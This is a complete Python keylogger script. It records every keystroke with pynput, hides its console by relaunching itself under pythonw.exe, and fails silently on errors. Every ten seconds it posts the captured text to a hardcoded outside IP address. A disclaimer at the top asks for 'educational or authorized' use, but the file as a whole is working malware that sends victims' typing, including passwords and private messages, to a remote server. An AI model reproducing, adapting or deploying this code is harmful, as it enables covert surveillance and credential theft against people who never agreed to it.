# keylogger_client.py

# WARNING: This is a keylogger script. 
# Using this software on a computer without the owner's explicit permission is
# illegal and unethical in many jurisdictions. The author of this script is not
# responsible for any misuse. Use this code responsibly and only for educational
# or authorized purposes.

import requests
import json
import threading
from pynput.keyboard import Key, Listener
import os
import sys
import subprocess

# --- Configuration ---
# The URL of the Flask API endpoint you created.
API_ENDPOINT = "http://3.6.94.252:80/receive" 
# How often to send the logs to the server (in seconds).
SEND_INTERVAL = 10 
# --- End of Configuration ---

# A global variable to store the keystrokes between sends.
log = ""

def on_press(key):
    """
    This function is called every time a key is pressed.
    It formats the key press and appends it to the global 'log' variable.
    """
    global log

    try:
        # For regular character keys, we can just get the character.
        log += key.char
    except AttributeError:
        # For special keys (e.g., Shift, Ctrl, Space, etc.).
        if key == Key.space:
            log += " "
        elif key == Key.enter:
            log += "\n"
        else:
            # For other special keys, log their name in brackets.
            log += f" [{key.name}] "

def send_log():
    """
    This function sends the captured keystrokes to the API endpoint.
    It runs on a separate thread and calls itself every SEND_INTERVAL seconds.
    """
    global log

    # Use strip() to check if the log contains any non-whitespace characters.
    if not log.strip():
        # If the log is empty or just whitespace, don't send anything.
        threading.Timer(SEND_INTERVAL, send_log).start()
        return

    try:
        # Create a temporary copy of the log to send.
        log_to_send = log
        # Clear the global log immediately to start capturing new keystrokes.
        log = ""
        
        payload = {"data": log_to_send}
        r = requests.post(API_ENDPOINT, json=payload)

        if r.status_code != 200:
            # If sending fails, prepend the unsent log back to the global log.
            # This prevents data loss.
            log = log_to_send + log
            pass

    except requests.exceptions.RequestException:
        # If there's a network error, also prepend the unsent log back.
        log = log_to_send + log
        pass
    
    finally:
        # Always schedule the next send operation.
        threading.Timer(SEND_INTERVAL, send_log).start()


def main():
    """
    Main function to start the keylogger listener.
    """
    # Start the listener that calls 'on_press' for each key event.
    with Listener(on_press=on_press) as listener:
        send_log()
        listener.join()

if __name__ == "__main__":
    # This block detaches the script from the terminal.
    try:
        # Check if the script is already running in the background (with pythonw.exe).
        # sys.executable is the path to the python interpreter.
        is_background_process = 'pythonw.exe' in sys.executable
        
        if not is_background_process:
            # If it's running in a terminal (with python.exe), relaunch it
            # with pythonw.exe to run it without a console window.
            pythonw_exe = sys.executable.replace("python.exe", "pythonw.exe")
            # sys.argv[0] is the name of the current script.
            subprocess.Popen([pythonw_exe, sys.argv[0]])
            # Exit the current (terminal-based) script.
            sys.exit()
        
        # If the script is already a background process, run the main keylogger logic.
        main()

    except Exception:
        # Fail silently if anything goes wrong.
        pass
